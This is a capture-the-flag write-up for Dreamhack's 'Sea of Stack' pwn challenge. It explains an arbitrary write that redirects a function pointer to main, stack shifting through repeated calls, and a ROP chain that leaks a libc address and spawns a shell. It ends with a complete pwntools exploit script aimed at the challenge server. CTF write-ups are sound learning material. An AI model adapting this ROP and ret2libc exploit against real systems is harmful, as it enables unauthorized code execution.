+++
date = '2026-05-13'
draft = false
title = 'Dreamhack Sea of Stack Writeup'
ShowToc = true
tags = ["Dreamhack", "pwn"]
+++


## Challenge overview
    
플래그는 바다에 버려요. 깊은 데 빠뜨려서, 아무도 못 찾게 해요.

---



```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  __int64 v4; // [rsp+0h] [rbp-30h] BYREF
  _QWORD *v5; // [rsp+8h] [rbp-28h] BYREF
  char s1[28]; // [rsp+10h] [rbp-20h] BYREF
  int number; // [rsp+2Ch] [rbp-4h]

  proc_init(argc, argv, envp);
  printf("If you really want to give me a present, bring me that kind detective's heart.\n> ");
  read_input(s1, 16);
  if ( !strcmp(s1, "Decision2Solve") && !gotPresent )
  {
    read_input(&v5, 8);
    read_input(&v4, 6);
    *v5 = v4;
    gotPresent = 1;
  }
  print_menu();
  number = read_number();
  if ( number == 1 )
  {
    safe();
  }
  else if ( number == 2 )
  {
    unsafe();
  }
  return 0;
}
```

```c
__int64 unsafe_func()
{
  _BYTE v1[32]; // [rsp+0h] [rbp-20h] BYREF

  return read_input(v1, 0x10000);
}
```

```c
void *safe_func()
{
  _BYTE s[48]; // [rsp+0h] [rbp-30h] BYREF

  read_input(s, 41);
  return memset(s, 0, 0x28u);
}
```


## Identifying the vulnerabilities


This is the memory layout in .bss:

```asm
.data:0000000000404010 ; __int64 (__fastcall *safe)()
.data:0000000000404010 safe            dq offset safe_func     ; DATA XREF: main+AF↑r
.data:0000000000404018                 public unsafe
.data:0000000000404018 ; __int64 (__fastcall *unsafe)()
.data:0000000000404018 unsafe          dq offset unsafe_func   ; DATA XREF: main+C5↑r
```

First thing, we get an arbitrary write. I'm assuming we have to overwrite one of these functions with something else.

The problem with the `unsafe_func` overflow is that after a specific amount of bytes, we start writing into forbidden memory space, way beyond the stack, and we get a *cannot dereference* error.

---

I had to cheat for this one...

Apparently, the way to do this was to overwrite `safe_func` with main, and call it a thousand times. That would decrease the `rbp` and `rsp` values enough that adding `0x10000` to `rbp` wouldn't escape anywhere we aren't allowed to write.

Here is before calling `main` a gazillion times:

```bash
*RBP  0x7fff3b8a0170 —▸ 0x7fff3b8a0288 —▸ 0x7fff3b8a0ef4 ◂— '/home/kali/Downloads/dreamhack/seaofstack/deploy/prob'
*RSP  0x7fff3b8a0140 —▸ 0x401446 (main) ◂— endbr64
```

Here is after:

```bash
RBP  0x7fff3b890730 —▸ 0x7fff3b890770 —▸ 0x7fff3b8907b0 —▸ 0x7fff3b8907f0 —▸ 0x7fff3b890830 ◂— ...
*RSP  0x7fff3b8906b0 ◂— 0xe
```

This happens because of the way the stack behaves. In the beginning of `main`:

```asm
; __unwind {
endbr64
push    rbp
mov     rbp, rsp
sub     rsp, 30h
```

Every time the main stack is initialized, its `rbp` takes the old one's `rsp`. That's why it kept moving backwards.

Anyways, actually running this exploit takes 16 minutes because of this, since we're doing it remotely to Koreea.

![challenge-screenshot](lol.png#center)

---

And, after the first ROP chain, we need to redirect back to `unsafe_func`, not main, since we messed everything up royally. 

After we bypass the crash condition, we can go ahead and build a ROP chain as usual. Since it's taking so long, I didn't want to test one gadgets, and I didn't want to install the required libc version either, to run this properly to try them on my machine first.

So I went ahead and wrote it using `system` and *"/bin/sh"*. 

This took me even longer before I figured it out! After two hours of testing, I raised the number of main repeats to `0x400`.

Finally, after a very long time, the flag:

![challenge-screenshot](flag.png#center)


---

## The Exploit

```python
from pwn import *
import time
elf = ELF('/home/kali/Downloads/dreamhack/seaofstack/deploy/prob')
libc = ELF('/home/kali/Downloads/dreamhack/seaofstack/deploy/libc.so.6')
#libc = ELF('/usr/lib/x86_64-linux-gnu/libc.so.6')

context.arch = 'amd64'
cyberedu = 'host8.dreamhack.games:21304'

ip, port = cyberedu.split(':')
port = int(port)

if args.REMOTE:
    p = remote(ip, port)
else:
    p = elf.process()
    
#gdb.attach(p)
    
puts_got = elf.got[b'puts']
puts_plt = elf.plt[b'puts']
main = 0x401446
unsafe = 0x401426

addr1 = p64(0x404010)
val = p32(main)

p.recvuntil(b"> ")
p.sendline(b"Decision2Solve\x00")

sleep(1)

#must be 8 len
p.send(addr1)
#must be 6 len
p.send(val + b'\x00' * 2)

#safe -> return to main
#do this a thousand times i guess
print('sup')
for i in range(0, 0x400):
    p.recvuntil(b"> ")
    p.sendline(b"1")
    
    p.recvuntil(b"> ")
    p.send(b"A"*16)
    print(f"i is {i}")

#have 0x10000 bytes into v1
#40129b: pop rdi; nop; pop rbp; ret; 

p.recvuntil(b"> ")
p.sendline(b"2")

pop_rdi_nop_pop_rbp_ret = 0x40129b
payload = ( b"A" * 32 +
            b"B" * 8 +
            p64(pop_rdi_nop_pop_rbp_ret) +
            p64(puts_got) +
            b"B"* 8 + 
            p64(puts_plt) +
            p64(unsafe)
          )
          
payload = payload.ljust(0x10000, b"\x90")
p.send(payload) 

data = p.recvline().strip()
val =  u64(data.ljust(8, b"\x00"))

libc.address = val - libc.sym[b'puts']
print(hex(libc.address))

#takes too long to bother checking one gadgets
#ret back to unsafe_func not main bc we fucked the registers
system = libc.sym['system']
binsh = next(libc.search(b"/bin/sh"))

ret = 0x40101a
payload = ( b"A" * 32 +
            b"B" * 8 +
            p64(pop_rdi_nop_pop_rbp_ret) +
            p64(binsh) +
            b"C"*8 +
            p64(ret) +
            p64(system) 
          )
          
payload = payload.ljust(0x10000, b"\x90")
p.send(payload) 

p.interactive()
```


As always, the full code can be found on my GitHub 
**[here](https://github.com/irinasusca/ctf-writeups/blob/main/dreamhack/seaofstack.py)**.
